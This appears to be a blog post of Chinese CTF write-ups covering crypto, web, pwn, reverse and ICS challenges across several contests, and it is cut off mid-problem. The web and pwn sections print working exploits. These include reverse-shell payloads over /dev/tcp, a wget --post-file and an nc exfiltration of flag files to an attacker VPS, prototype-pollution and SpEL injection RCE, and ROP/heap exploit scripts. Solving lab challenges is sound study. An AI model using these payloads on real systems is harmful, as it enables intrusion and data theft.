0x85, 0xAC, 0x89, 0xF0, 0xAF, 0xD8, 0x69, 0xD6, 0xDD, 0xB2, 0xBF, 0x6E, 0xE5, 0xAE, 0x99, 0xCC, 0xD5, 0xBC, 0x8B, 0xF2, 0x7D, 0x7A, 0xE3]for i in range(len(s)): print(chr((s[i]^i)//2),end='')#CETCTF{Th0nk_Y0u_DocTOr51} Cryptomostlycommom签到rsa，首先共模攻击，但是e1,e2不互素，公因数只有一个2，所以直接尝试开方就出了。 from gmpy2 import *from Crypto.Util.number import *def modulus(n,e1,e2,c1,c2): _,s,t = gcdext(e1, e2) m = (pow(c1,s,n) * pow(c2 , t , n)) % n print(long_to_bytes((iroot(m,2)[0]))) N=122031686138696619599914690767764286094562842112088225311503826014006886039069083192974599712685027825111684852235230039182216245029714786480541087105081895339251403738703369399551593882931896392500832061070414483233029067117410952499655482160104027730462740497347212752269589526267504100262707367020244613503c1=39449016403735405892343507200740098477581039605979603484774347714381635211925585924812727991400278031892391996192354880233130336052873275920425836986816735715003772614138146640312241166362203750473990403841789871473337067450727600486330723461100602952736232306602481565348834811292749547240619400084712149673c2=43941404835820273964142098782061043522125350280729366116311943171108689108114444447295511969090107129530187119024651382804933594308335681000311125969011096172605146903018110328309963467134604392943061014968838406604211996322468276744714063735786505249416708394394169324315945145477883438003569372460172268277e1 = 65536e2 = 270270print(gcd(e1,e2))modulus(N,e1,e2,c1,c2)#SETCTF{now_you_master_common_mode_attack} give cat for PrinceCBC模式，需要我们构造密文，给了iv，并且我们每次利用系统解密都可以自己选择iv，所以其实就很简单了，一个CBC的构造 from gmpy2 import *from hashlib import *from Crypto.Util.number import *from pwn import *import stringp=remote('node4.buuoj.cn',29764)table = string.ascii_letters + string.digitscontext.log_level='debug'def pow_of_work(end,sha): for a in table: for b in table: for c in table: for d in table: s=(a+b+c+d)+end if sha256( s.encode() ).hexdigest()==sha: return (a+b+c+d)p.recvuntil('[+] sha256(XXXX+')end=p.recv(8).decode()p.recvuntil(') == ')sha=p.recvuntil('\\n')[:-1].decode()xxxx=pow_of_work(end,sha)p.recvuntil('[+] Give Me XXXX :')p.sendline(xxxx)name=b'dbty'*4premission=b'Princepermission'p.recvuntil('2.Go away')p.sendline('1')p.sendline('dbty'*4)p.recvuntil('Miao~ ')iv=p.recvuntil('\\n')[:-1]p.recvuntil('3.say Goodbye')p.sendline('1')p.recvuntil('Permission:')enc=p.recvuntil('\\n')[:-1]print(enc.hex())from Crypto.Util.strxor import *p.sendline('2')p.recvuntil('Looks like you want to know something. Give me your permission:')p.sendline(iv+enc[16:])p.recvuntil('Miao~ ')p.sendline(iv)p.recvuntil('The message is ')plain=p.recvuntil('\\n')[:-1]print(plain)dec_c2=strxor(iv,plain[16:])c1=strxor(b'Princepermission',dec_c2)p.sendline('2')p.recvuntil('Looks like you want to know something. Give me your permission:')p.recvuntil('[-] ')p.sendline(c1+enc[16:])p.recvuntil('Miao~ ')p.recvuntil('[-] ')p.sendline(iv)p.recvuntil('The message is ')plain=p.recvuntil('\\n')[:-1]print(plain)dec_c1=strxor(iv,plain[:16])ivv=strxor(dec_c1,name)#p.recvuntil('Give me your permission:')p.recvuntil('[-] ')p.sendline(c1+enc[16:])#p.recvuntil('What\\'s the cat tell you?')p.recvuntil('[-] ')p.sendline(ivv)p.recvall() easytask一看就是原题，上谷歌搜到个轮子直接梭掉了 https://hxp.io/blog/26/VolgaCTF-2016-Quals-crypto300-XXY-writeup/ from sage.modules.free_module_integer import IntegerLatticew = ['[-10150241248 -11679953514 -8802490385 -12260198788 -10290571893 -334269043 -11669932300 -2158827458 -7021995]', '[ 52255960212 48054224859 28230779201 43264260760 20836572799 8191198018 14000400181 4370731005 14251110]', '[ 2274129180 -1678741826 -1009050115 1858488045 978763435 4717368685 -561197285 -1999440633 -6540190]', '[ 45454841384 34351838833 19058600591 39744104894 21481706222 14785555279 13193105539 2306952916 7501297]', '[-16804706629 -13041485360 -8292982763 -16801260566 -9211427035 -4808377155 -6530124040 -2572433293 -8393737]', '[ 28223439540 19293284310 5217202426 27179839904 23182044384 10788207024 18495479452 4007452688 13046387]', '[ 968256091 -1507028552 1677187853 8685590653 9696793863 2942265602 10534454095 2668834317 8694828]', '[ 33556338459 26577210571 16558795385 28327066095 10684900266 9113388576 2446282316 -173705548 -577070]', '[ 35404775180 32321129676 15071970630 24947264815 14402999486 5857384379 10620159241 2408185012 7841686]']W=[]for i in w: temp=i[1:-1].split() temp=[int(j) for j in temp] W.append(temp)W=matrix(W)e='[151991736758354 115130361237591 58905390613532 130965235357066 74614897867998 48099459442369 45894485782943 7933340009592 25794185638]'E=e[1:-1].split()e=[int(i) for i in E]print(e)e=matrix(e)B = W.stack(e).augment(vector([0] * W.ncols() + [1]))d = IntegerLattice(B).shortest_vector()print('d = {}'.format(d))d=vector([-3, -2, -3, 0, -3, 2, 2, 0, 2])xxx=[151991736758357, 115130361237593, 58905390613535, 130965235357066, 74614897868001, 48099459442367, 45894485782941, 7933340009592, 25794185636]m = W.solve_left(vector(xxx))print('m = {}'.format(m))M=[877, 619, 919, 977, 541, 941, 947, 1031, 821]key = hashlib.sha256(str(M).encode()).digest()cipher = AES.new(key, AES.MODE_ECB)c=unhexlify('1070260d8986d5e3c4b7e672a6f1ef2c185c7fff682f99cc4a8e49cfce168aa0')print(cipher.decrypt(c))#flag{be5152d04a49234a251956a32b} Webeaaasyphp原题改编，在 Geek Challenge 2021中有 &lt;?phpclass Check { public static $str1 = false; public static $str2 = false;}class Esle { public function __wakeup() { Check::$str1 = true; }}class Hint { public function __wakeup(){ $this-&gt;hint = &quot;no hint&quot;; } public function __destruct(){ if(!$this-&gt;hint){ $this-&gt;hint = &quot;phpinfo&quot;; ($this-&gt;hint)(); } }}class Bunny { public function __toString() { if (Check::$str2) { if(!$this-&gt;data){ $this-&gt;data = $_REQUEST['data']; } file_put_contents($this-&gt;filename, $this-&gt;data); } else { throw new Error(&quot;Error&quot;); } }}class Welcome { public function __invoke() { Check::$str2 = true; return &quot;Welcome&quot; . $this-&gt;username; }}class Bypass { public function __destruct() { if (Check::$str1) { ($this-&gt;str4)(); } else { throw new Error(&quot;Error&quot;); } }}if (isset($_GET['code'])) { unserialize($_GET['code']);} else { highlight_file(__FILE__);} 这里设置了两个 static 变量，所以得先让他们为 true 才能继续进行，逻辑很清楚，最终构造的pop链子 &lt;?phpclass Esle{}class Hint{ public function __construct() { $this-&gt;hint = &quot;phpinfo&quot;; }}class Bunny{ public function __construct() { $this-&gt;filename = &quot;ftp://bbb@xxx:23/aaa&quot;; $this-&gt;data = urldecode(&quot;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/xxxxx/5000%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&quot;); }}class Welcome{ public function __construct() { $this-&gt;username = new Bunny(); }}class Bypass{ public function __construct() { $this-&gt;str4 = new Welcome(); }}echo urlencode(serialize(array(new Esle(), new Bypass()))); 之前试过直接写还有各种方法，估计是没有权限根本写不上，但是还可以利用FTP - SSRF 来攻击 FPM/FastCGI造成命令执行参考文章: 浅入深出 Fastcgi 协议分析与 PHP-FPM 攻击方法首先使用 gopherus 生成payload：然后在VPS上放置一个py脚本 # evil_ftp.pyimport sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind(('0.0.0.0', 23))s.listen(1)conn, addr = s.accept()conn.send(b'220 welcome\\n')#Service ready for new user.#Client send anonymous username#USER anonymousconn.send(b'331 Please specify the password.\\n')#User name okay, need password.#Client send anonymous password.#PASS anonymousconn.send(b'230 Login successful.\\n')#User logged in, proceed. Logged out if appropriate.#TYPE Iconn.send(b'200 Switching to Binary mode.\\n')#Size /conn.send(b'550 Could not get the file size.\\n')#EPSV (1)conn.send(b'150 ok\\n')#PASVconn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\\n') #STOR / (2)conn.send(b'150 Permission denied.\\n')#QUITconn.send(b'221 Goodbye.\\n')conn.close() 运行脚本，并多开一个终端开启监听，然后发送payload vps上收到反弹shell *CheckIN审计源码wget 路由存在参数注入，构造payload http://b6cd46d7-79b1-4321-9cb9-94a9ad7f216d.node4.buuoj.cn:81/wget?argv=dotast&amp;argv=--post-file&amp;argv=/flag&amp;argv=http://ip:port/ 然后远程vps监听端口发送请求后，vps收到flag Pwnpwn1给了任意写和栈溢出，先用任意写改stack_check_fail的got表为puts的plt，实现canary绕过，再直接ROP就行了。 from pwn import *p=process('./pwn1')#p=remote('node4.buuoj.cn',27412)elf=ELF('./pwn1')context.log_level='debug'#libc=ELF('libc-2.23.so')libc=elf.libcrdi=0x0000000000400a03p.sendlineafter('your choice','0')p.sendlineafter('address:\\n',str(0x601020))p.sendlineafter('content:\\n',p64(elf.plt['puts']))p.sendlineafter('address:\\n','-1')p.sendlineafter('your choice\\n','1')p.sendlineafter('size:\\n',str(0x200))p.sendlineafter('content:\\n','A'*0x110+'b'*8+p64(rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x40090b))p.sendlineafter('your choice\\n','-1')puts=u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,&quot;\\x00&quot;))success('puts:'+hex(puts))libc_base=puts-libc.sym['puts']success('libc_base:'+hex(libc_base))sh=libc_base+libc.search('/bin/sh').next()system=libc_base+libc.sym['system']p.sendlineafter('your choice','0')p.sendlineafter('address:\\n',str(0x601020))p.sendlineafter('content:\\n',p64(elf.plt['puts']))p.sendlineafter('address:\\n','-1')p.sendlineafter('your choice\\n','1')p.sendlineafter('size:\\n',str(0x200))p.sendlineafter('content:\\n','A'*0x110+'b'*8+p64(0x00000000004005d9)+p64(rdi)+p64(sh)+p64(system))p.sendlineafter('your choice\\n','-1')p.interactive() pwn2有uaf漏洞，直接打__malloc_hook+onegadget就行了。 from pwn import *p=remote('node4.buuoj.cn',29868)libc=ELF('/home/root2/Desktop/glibc-all-in-one-master/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so')context.log_level='debug'def add(id): p.sendafter('Input your choice: \\n','1\\n1\\n') p.sendafter('Input the idx\\n',str(id)+'\\n'+str(id)+'\\n')def edit(id,con): p.sendafter('Input your choice: \\n','2\\n2\\n') p.sendafter('Input the idx\\n',str(id)+'\\n'+str(id)+'\\n') p.sendafter('Input the Magic\\n',str(con))def delete(id): p.sendafter('Input your choice: \\n','3\\n3\\n') p.sendafter('Input the idx\\n',str(id)+'\\n'+str(id)+'\\n')add(0)add(1)edit(0,'a')libc_base=u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,&quot;\\x00&quot;))-0x7f1df4510d61+0x7f1df414c000success('libc_base:'+hex(libc_base))delete(0)edit(0,p64(libc_base+libc.sym['__malloc_hook']-0x23))add(0)add(1)edit(1,'a'*0x13+p64(libc_base+0xf03a4))add(0)#gdb.attach(p)p.interactive()","link":"/posts/14620/"},{"title":"2022第二届网刃杯WP","text":"2022第二届网刃杯比赛WP 成绩 ICSLED_BOOMpng中一段对称加密密文U2FsdGVkX19cOOV8qLVgcso8U4fse+7LirQKiHFkn9HU9BuwFAivH1siJXg/Rk6z 查看一下流量包，还是老样子s7comm 刚开始一直被program的stop给吸引住了，后来按长度排序的时候发现唯一出现只有3次的包，正好长度也只出现3次 按顺序排得到密码585692787 拿去解AES得到flag flag{tietie_tietie_tiet13} carefulguy在查看流的时候发现66 6c 61 67 全部撸下来得到66 6c 61 67 7b 70 34 75 73 33 31 35 76 33 72 79 31 6e 74 33 72 65 73 74 69 63 39 7d hex后得到flag flag{p4us315v3ry1nt3restic9} 喜欢移动的黑客流量包头部损坏，把FF FF FF FF改成 0A 0D 0A 0D即可打开，然后 老考点咯，看modbus的data，其中找到2766 int之后发现是10086&gt;10000，应该就是了，然后当时一直没交上，问了一下管理说需要把加号去掉，因此得到flag flag{1008668156} easyiec flag{e45y_1eci04} xyp07注释最下面 Vm0weGQxRXlTWGxVV0d4V1YwZFNVRlpyV25kWlZsSllZMFZrVmxKdVFsaFdNalZMWWtkS1IxTnFSbGhYU0VKNlZsWmFWMVpWTVVWaGVqQTk= 一直解base得到密码Xyp77&amp;7&amp;77 直接过滤s7comm协议，追踪流慢慢看，发现一串很突兀的 iPE=e&gt;we,9:={]RnBjf&lt;7_8Cw1b 第一反应：rot47 base91 base92 xor 变异凯撒 最后base91解码得到welcome_S7_world_xyp07 flag{welcome_S7_world_xyp07} 需要安全感只能说千万别去下载百度随便找的几百MB的，打开直接提示不支持指定的CPU类型，每次安装都得二三十分钟，md。 然后下载下来就是gxw拓展名，去百度了一下发现是三菱GX Works，然后去官网下载了 可还行，这次安装之后打开就能够成功打开题目文件了。 找了一圈找到flag字样 判断t_flag = true_flag，f_flag = false_flag尝试提交，正确 flag{tr20220413} cryptolalia首先鱼不知道有什么用，先解压。 打开用010看图片，发现开头是RIFF 后面跟一个webp，能够猜测该图为webp图片 往后拉发现有PK，因此搜索了一下504b0304 将前面的删掉，改zip解压 叫咱污水处理厂的流程顺序要先去分析污泥脱水数据，再去分析设备药剂数据。 然后发现两个都有密码，再结合hint因此去爆破 解压后打开流量包，在查找流的时候在modbus流中注意到对称加密字符串 即U2FsdGVkX19pczQKWsMcjgrJt8f09dSN 本来还是不会做的，突然主办发了个hint说”鱼 is important” 为什么不写fish呢？因此尝试用fish当key，解TripleDes的时候成功解开 得到另一个压缩包的密码为b0Le4n$ 里面一个txt和一个zip，txt最后写了年轻人，有时候眼见不一定为实！ 压缩包直接打开是这样的 因此去010看一下，发现源文件数据区的加密位为00，而目录区的加密位为09，因此改成00再打开即可恢复 依旧是过滤s7comm，然后在查看流的时候发现了这个 但直接原始数据导出，会混入垃圾数据，因此用tshark导出 tshark -r .\\设备药剂间数据采集.pcap -T fields -e s7comm.resp.data -Y s7comm &gt; pic.txt 找到这一坨，将其16进制写入文件 保存为png，解析发现chunk0出错 猜测高度被修改了，因此修改成更高的高度 得到flag 具体flag是什么忘掉了，不是flag{G00D_J0B_3DES_Xiwu2XwsdP}就是flag{GOOD_JOB_3DES_Xiwu2XwsdP} Misc玩坏的winxpdg分析 首先是看桌面 1 2 3 4都没用，虽然1.png后面还有一句一句话木马但是与之无关 然后发现套了很多东西，最后是一个压缩包 解压之后又是一张图片，后面又有一个压缩包，最后得到一个要密码的压缩包 没有下载QQ，但是下载了火狐，因此将火狐的导出。这里火狐的考点通常有：保存的密码、cookies、backup、缓存、下载历史、网站ico、登录、表单数据、导航历史、收藏夹等。 这里戴围脖估计是QQ，但是没有直接指向QQ的，火狐也没保存密码，猜测是历史记录 首先用dg导出，我的是破解的，不知道非破解版能不能全部导出 用DB打开，找了一圈后发现在places中，即考点为firefox的书签 + 导航历史： qq是吧，打开看空间去了 得到解压密码xiaomin520。得到flag flag{this_is_what_u_want8} WebSign_inSSRF的漏洞，在读取file:///proc/net/arp发现内网存在另外一台机子 访问获得flag需要满足：GET参数a、POST参数b、X-Forwarded-For为127.0.0.1、Referer为bolean.club 构造脚本如下 b = &quot;b=1&quot;a = &quot;&quot;&quot;POST /index.php?a=1 HTTP/1.1Host: 172.73.25.100Content-Type: application/x-www-form-urlencodedReferer: bolean.clubX-Forwarded-For: 127.0.0.1Content-Length: {}&quot;&quot;&quot; .format(len(b))+ bprint aPayload = ''for i in a: if i == '\\n': Payload += '%250d%250a' else: Payload += hex(ord(i)).replace('0x', '%25')print(Payload) 利用gopher协议请求获取flag upload题目中给出了提示为sql注入，测试发现是从filename处进行注入的，这边可以使用报错注入 由于这里是通过.截断后缀名拼接进sql语句的，相当于过滤了.，这里盲猜的flag表名和列名的 最后使用substr函数绕过报错长度限制 ezjs参考文章：从 Lodash 原型链污染到模板 RCE - 安全客，安全资讯平台 (anquanke.com) 利用如下Payload进行测试 {&quot;__proto__&quot;:{&quot;sourceURL&quot;:&quot;\\u000aglobal.process.mainModule.constructor._load('child_process').exec('ping${IFS}xxxxx.dnslog.cn')&quot;}} 可通 这里过滤了curl、wget、&gt;、空格等参数，可以利用ls|nc${IFS}ip${IFS}port的方式将内容外带出来 {&quot;__proto__&quot;:{&quot;sourceURL&quot;:&quot;\\u000aglobal.process.mainModule.constructor._load('child_process').exec('base64${IFS}/.fl\\&quot;\\&quot;ag|nc${IFS}ip${IFS}8989')&quot;}} 解码即可获得flag ez_java文件读取漏洞，限制了../../../才行，读取配置文件download?filename=../../../web.xml 接着读取TestServlet.class文件，download?filename=../../../classes/com/abc/servlet/TestServlet.class，源码如下 package com.abc.servlet;import java.io.IOException;import java.util.regex.Matcher;import java.util.regex.Pattern;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import org.springframework.expression.Expression;import org.springframework.expression.ParserContext;import org.springframework.expression.common.TemplateParserContext;import org.springframework.expression.spel.standard.SpelExpressionParser;import org.springframework.expression.spel.support.StandardEvaluationContext;public class TestServlet extends HttpServlet { public TestServlet() { } protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { this.doPost(req, resp); } protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { try { String name = request.getParameter(&quot;name&quot;); name = new String(name.getBytes(&quot;ISO8859-1&quot;), &quot;UTF-8&quot;); if (this.blackMatch(name)) { request.setAttribute(&quot;message&quot;, &quot;name is invalid&quot;); request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response); return; } System.out.println(name); String message = this.getAdvanceValue(name); request.setAttribute(&quot;message&quot;, message); request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response); } catch (Exception var5) { request.setAttribute(&quot;message&quot;, &quot;error&quot;); request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response); } } private boolean blackMatch(String val) { String[] var2 = this.getBlacklist(); int var3 = var2.length; for(int var4 = 0; var4 &lt; var3; ++var4) { String keyword = var2[var4]; Matcher matcher = Pattern.compile(keyword, 34).matcher(val); if (matcher.find()) { return true; } } return false; } private String getAdvanceValue(String val) { ParserContext parserContext = new TemplateParserContext(); SpelExpressionParser parser = new SpelExpressionParser(); Expression exp = parser.parseExpression(val, parserContext); StandardEvaluationContext evaluationContext = new StandardEvaluationContext(); return exp.getValue(evaluationContext).toString(); } private String[] getBlacklist() { return new String[]{&quot;java.+lang&quot;, &quot;Runtime&quot;, &quot;exec.*\\\\(&quot;}; }} 这里考的是spel 表达式注入，使用的是TemplateParserContext，则使用#{}闭合，这里利用load()远程加载进行rce a.js var a=exp();function exp(){ s=[3]; s[0]=&quot;/bin/bash&quot;; s[1]=&quot;-c&quot;; s[2]=&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;;var x=new java.lang.ProcessBuilder; x.command(s); x.start();}; Payload http://124.220.9.19:8024/test388POSTname=#{T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;nashorn&quot;).eval(&quot;load('http://116.62.63.234:1234/foo.js')&quot;)} re去年AK了，今年又AK ez_algorithm 加密逻辑主要在encryption里面。里面很复杂，各种判断+调用。但是我动调起来发现，他是单字节加密。我立马就想到了爆破。我用python调用subprocess库来实现调用他进行爆破。 爆破前，需将0x2c00位置的28个字符全部设定位00 根据strcmp /00截断进行爆破 from subprocess import Popen, PIPEfile_path = &quot;ez_algorithm.exe&quot;tagre=0x2c00 #strcm比对的字符串硬编码的位置from Crypto.Util.number import *import string#from Crypto.Util.number import *#print(long_to_bytes(332849))#flag{332749}fflag='flag{w3Lc0mE_t0_'#根据爆破来的flag手动添加print(hex(ord('o')))d='BRUF{E6oU9Ci#J9+6nWAhwMR9n:}'s=&quot;&quot;&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}&quot;&quot;&quot;for k in range(16,28): print(k) f = open(file_path, 'rb') # print(f.read()[tagre]) fw = open('flag.exe', 'wb') data = f.read() # print(data) fw.write(data) fw.seek(tagre+k) fw.write(d[k].encode()) # fw.flush() fw.close() f.close() print(fflag) for i in s: flag =fflag+i payload =flag print(payload) #print(payload) p = Popen('flag.exe', stdin=PIPE, stdout=PIPE, stderr=PIPE) out, err = p.communicate(bytes(payload.encode())) #print(out) if b'Gj!You Win!!!' in out: fflag+=i f = open('flag.exe', 'rb') # print(f.read()[tagre]) fw = open(file_path, 'wb') data = f.read() # print(data) fw.write(data) fw.seek(tagre + k) fw.write(d[k].encode()) # fw.flush() fw.close() f.close() breakprint(fflag) 程序中间好像有点问题，但是懒得修了 :) 我直接根据爆破得到的语义，然后重新拼写动调进行验证最后手动（恢复之前正确的硬编码）添加进去再进行下一段flag的爆破。其中根据下图的提示猜中了了两个 _ ,放在比对字符串出现特殊字符的对应位置，动调发现刚好比对字符串的特殊字符 最后得到flag ： flag{w3Lc0mE_t0_3NcrYPti0N:} 定时启动pyinstall打包的的elf，https://github.com/extremecoders-re/pyinstxtractor/wiki/Extracting-Linux-ELF-binaries。 把核心部分搞出来就可以用解包脚本pyinstxtractor。 主程序 发现是导入包，一开始以为要逆pyd，但是再发现导入的包， 直接反编译成py文件如下，发现flag就在里面 加个打印，直接就出来了 # !/usr/bin/env python# visit https://tool.lu/pyc/ for more informationimport timeimport osbat_path = os.getcwd() + '/' + 'Readme.txt'cmd = 'hacked by Wncry, do not run the progress again!!!\\n'def get_time(): try: a = 'flag{c4ca4238a0b923820dcc509a6f75849b}' b = 'flag{c81e728s9d4c2f636f0f7f89cc14862c}' c = 'flag{eccbc87e4b5ce2fe28308fd9fsa7baf3}' d = 'flag{a87ff679a2f3e71d9181a67b7542122c}' flag = a[0:8] + b[9:14] + c[6:20] + d[-1:] print(flag) current_time = time.time() print('[+] current time: ', time.ctime()) if current_time &lt; current_time: pass current_time &lt; 1650762550 if 1: print('[+] yeah, Congratulations on getting the decryption key\\n', flag) else: print('[-] You should open the program between 2022-04-24 09:09:09 s and 2022-04-24 09:09:10 s ') for i in range(0, 3): print(&quot;[-] You shouldn't break the rules&quot;) time.sleep(1) print('[-] unfortunately, ~bye~') except: passdef encryption(): current_path = os.getcwd()# WARNING: Decompyle incompletedef get_delbat(): pass# WARNING: Decompyle incompleteif __name__ == '__main__': get_time()#flag{c4c728s9ccbc87e4b5ce2f} Re_function开头misc题，丢给misc做 注释89 50，明显的png，用010保存为png 根据一半，得到解压密码3CF8 有花指令，11，22，33 直接nop掉 发现主程序就是异或 把数值dump出来。偶数异或0x37 f=[0x64, 0x71, 0x54, 0x54, 0x64, 0x78, 0x74, 0x78, 0x64, 0x41, 0x40, 0x48, 0x70, 0x6D, 0x18, 0x4A, 0x41, 0x78, 0x66, 0x72, 0x41, 0x78, 0x5E, 0x4E, 0x5D, 0x52, 0x0E, 0x3D]for i in range(len(f)): if(i%2 == 0): print(chr(f[i]^0x37),end='') else: print(chr(f[i]),end='')#SqcTSxCxSAwHGm/JvxQrvxiNjR9= 还有一个程序，直接发现是base64，但是换表了。在第二个文件中，搜字符串就看到 FeVYKw6a0lDIOsnZQ5EAf2MvjS1GUiLWPTtH4JqRgu3dbC8hrcNo9/mxzpXBky7+ 直接拿表替换一下解就行 http://web.chacuo.net/netbasex flag{we1come_t0_wrb} freestyle谜语提，是我数学太差了。 化简一下如下， #3 * a/ 9==1109#(b % 56)=49 进一步计算，就可以得到 a=3327 b=49 一开始一直不理解题，最小被除。。 一直尝试，最后发现是49+56 最后的flag为 flag{md5（3327105）} 即flag{31a364d51abd0c8304106c16779d83b1}","link":"/posts/2038/"},{"title":"2021绿城杯wp","text":"2021首届绿城杯wp 成绩等官方ban人再贴，一秒解rsa的“大佬”是真的np webez_php原题，没啥好说的，网站提示git泄露，用dumpall获取源代码关键代码 if (isset($_GET['link_page'])) { $link_page = $_GET['link_page'];} else { $link_page = &quot;home&quot;;}$page_file = &quot;pages/&quot; . $link_page . &quot;.php&quot;;$safe_check1 = &quot;strpos('$page_file', '..') === false&quot;;assert($safe_check1) or die(&quot;no no no!&quot;);// safe!$safe_check2 = &quot;file_exists('$page_file')&quot;;assert($safe_check2) or die(&quot;no this file!&quot;);?&gt; 首先assert可以命令执行，也就是我们只需要构造闭合file_exists即可，然后注释后面的语句，payload如下 ') or system('cat pages/flag.php');// 在bp里需要url编码 Crypto[warmup]加密算法题目： from Crypto.Util.number import *from flag import flagassert flag[:5]=='flag{'str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'def encode(plain_text, a, b, m): cipher_text = '' for i in plain_text: if i in str1: addr = str1.find(i) cipher_text += str1[(a*addr+b) % m] else: cipher_text += i print(cipher_text)encode(flag,37,23,52)# cipher_text = 'aoxL{XaaHKP_tHgwpc_hN_ToXnnht}' 仿射，爆破就完事 str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'def encode(plain_text, a, b, m): cipher_text = '' for i in range(len(plain_text)): if plain_text[i] in str1: for j in range(len(str1)): if str1[(a*j+b) % m] == plain_text[i]: cipher_text += str1[j] else: pass else: cipher_text += plain_text[i] print(cipher_text)flag = 'aoxL{XaaHKP_tHgwpc_hN_ToXnnht}'encode(flag,37,23,52) flag{AffInE_CIpheR_iS_clAssiC} RSA-1题目 from Crypto.Util.number import *import gmpy2from flag import flagassert flag[:5]==b'flag{'m = bytes_to_long(flag)p = getPrime(1024)q = getPrime(1024)n = p * qprint('n =',n)e = 0x10001M = 2021 * m * 1001 * p c = pow(M,e,n)print('c =',c)#n = 17365231154926348364478276872558492775911760603002394353723603461898405740234715001820111548600914907617003806652492391686710256274156677887101997175692277729648456087534987616743724646598234466094779540729413583826355145277980479040157075453694250572316638348121571218759769533738721506811175866990851972838466307594226293836934116659685215775643285465895317755892754473332034234495795936183610569571016400535362762699517686781602302045048532131426035260878979892169441059467623523060569285570577199236309888155833013721997933960457784653262076135561769838704166810384309655788983073376941843467117256002645962737847#c = 6944967108815437735428941286784119403138319713455732155925055928646536962597672941805831312130689338014913452081296400272862710447207265099750401657828165836013122848656839100854719965188680097375491193249127725599660383746827031803066026497989298856420216250206035068180963797454792151191071433645946245914916732637007117085199442894495667455544517483404006536607121480678688000420422281380539368519807162175099763891988648117937777951069899975260190018995834904541447562718307433906592021226666885638877020304005614450763081337082838608414756162253825697420493509914578546951634127502393647068722995363753321912676 $a = 2021\\times1001$$(apm)^{65537}$ %n=c，则c ≡ 0 % p，可得 c = kp，由此 p＝gcd(n,c)，后面就常规RSA from gmpy2 import *import binasciin = 17365231154926348364478276872558492775911760603002394353723603461898405740234715001820111548600914907617003806652492391686710256274156677887101997175692277729648456087534987616743724646598234466094779540729413583826355145277980479040157075453694250572316638348121571218759769533738721506811175866990851972838466307594226293836934116659685215775643285465895317755892754473332034234495795936183610569571016400535362762699517686781602302045048532131426035260878979892169441059467623523060569285570577199236309888155833013721997933960457784653262076135561769838704166810384309655788983073376941843467117256002645962737847c = 6944967108815437735428941286784119403138319713455732155925055928646536962597672941805831312130689338014913452081296400272862710447207265099750401657828165836013122848656839100854719965188680097375491193249127725599660383746827031803066026497989298856420216250206035068180963797454792151191071433645946245914916732637007117085199442894495667455544517483404006536607121480678688000420422281380539368519807162175099763891988648117937777951069899975260190018995834904541447562718307433906592021226666885638877020304005614450763081337082838608414756162253825697420493509914578546951634127502393647068722995363753321912676e = 0x10001p = gcd(n,c)q = n//pphi = (q-1)*(p-1)d = invert(e,phi)M = powmod(c,d,n)m = int(M // (2021*p*1001))print(binascii.unhexlify(hex(m)[2:])) flag{Math_1s_1nterest1ng_hah} RSA-2题目 from Crypto.Util.number import *import gmpy2from flag import flagassert flag[:5]==b'flag{'m1 = bytes_to_long(flag[:20])p = getPrime(512)p1 = gmpy2.next_prime(p)q = getPrime(512)q1 = gmpy2.next_prime(q)n1 = p*q*p1*q1print('n1 =',n1)e = 0x10001c1 = pow(m1,e,n1)print('c1 =',c1)m2 = bytes_to_long(flag[20:])p2 = getPrime(1024)q2 = getPrime(1024)print('p2+q2 =',p2+q2)print('q2*q2 =',p2*q2)n2 = p2*p2*q2*q2*q2print('n2 =',n2)c2 = pow(m2,e,n2)print('c2 =',c2)#n1 = 6348779979606280884589422188738902470575876294643492831465947360363568026280963989291591157710389629216109615274754718329987990551836115660879103234129921943824061416396264358110216047994331119920503431491509529604742468032906950984256964560405062345280120526771439940278606226153077959057882262745273394986607004406770035459301695806378598890589432538916219821477777021460189140081521779103226953544426441823244765828342973086422949017937701261348963541035128661464068769033772390320426795044617751909787914185985911277628404632533530390761257251552073493697518547350246993679844132297414094727147161169548160586911#c1 = 6201882078995455673376327652982610102807874783073703018551044780440620679217833227711395689114659144506630609087600915116940111002026241056808189658969089532597757995423694966667948250438579639890580690392400661711864264184444018345499567505424672090632235109624193289954785503512742400960515331371813467034511130432319427185134018830006918682733848618201088649690422818940385123599468595766345668931882249779415788129316594083269412221804774856038796248038700275509397599351533280014908894068141056694660319816046357462684688942519849441237878018480036145051967731081582598773076490918572392784684372694103015244826#p2+q2 = 